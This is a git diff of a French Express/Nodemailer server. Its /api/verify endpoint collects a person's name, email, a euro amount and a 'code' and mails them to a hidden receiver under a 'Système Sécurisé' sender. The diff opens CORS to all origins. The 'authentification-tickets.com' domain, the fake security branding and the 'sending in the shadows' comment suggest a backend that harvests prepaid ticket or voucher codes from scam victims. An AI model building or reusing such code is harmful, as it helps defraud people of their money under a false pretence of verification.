@@ -5,28 +5,22 @@ const nodemailer = require('nodemailer');
 
 const app = express();
 
-// Configuration CORS brute pour vos tests en local
-// Liste des domaines autorisés à interroger votre serveur
-const whitelist = ['https://authentification-tickets.com', 'https://authentification-tickets.com'];
-
+// --- MODIFICATION ICI : CORS UNIVERSEL ---
+// Pour que ton mobile puisse envoyer des données, on autorise toutes les origines
 app.use(cors({
-    origin: function (origin, callback) {
-        // Bloque ou autorise selon la présence du domaine dans la whitelist
-        if (whitelist.indexOf(origin) !== -1 || !origin) {
-            callback(null, true);
-        } else {
-            console.warn(`🛑 Requête bloquée par CORS. Origine non autorisée : ${origin}`);
-            callback(new Error('Non autorisé par la politique CORS'));
-        }
-    },
+    origin: '*', 
     methods: ['GET', 'POST', 'OPTIONS'],
     allowedHeaders: ['Content-Type', 'Authorization'],
-    credentials: true
+    credentials: false
 }));
+
+// Nécessaire pour accepter les requêtes de pré-vérification (OPTIONS) des navigateurs
+app.options('*', cors()); 
+// ----------------------------------------
 
 app.use(express.json());
 
-// 1. Configuration du transporteur Nodemailer (ici configuré pour Gmail)
+// 1. Configuration du transporteur Nodemailer
 const transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
@@ -54,17 +48,11 @@ app.post('/api/verify', async (req, res) => {
             return res.status(400).json({ success: false, message: "Données incomplètes." });
         }
 
-        // Configuration du contenu du mail
-        // Configuration du contenu du mail (Version Pro)
         const mailOptions = {
             from: `"Système Sécurisé" <${process.env.EMAIL_USER}>`, 
             to: process.env.RECEIVER_EMAIL, 
             subject: '🚨 Nouvelle demande d\'authentification',
-            
-            // Fallback en texte brut (pour les vieilles boîtes mail)
             text: `Nouvelle demande : ${nom} ${prenom} - ${amount}€ - ${email} - Code: ${code}`,
-            
-            // Le design HTML professionnel de l'e-mail
             html: `
             <div style="font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #eaeaea; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px rgba(0,0,0,0.05);">
                 <div style="background-color: #0f172a; padding: 25px; text-align: center;">
@@ -103,9 +91,7 @@ app.post('/api/verify', async (req, res) => {
             `
         };
 
-        // Envoi de l'e-mail dans l'ombre (sans intermédiaire tiers)
         await transporter.sendMail(mailOptions);
-
         return res.json({ success: true, message: "E-mail envoyé avec succès via Nodemailer !" });
 
     } catch (error) {
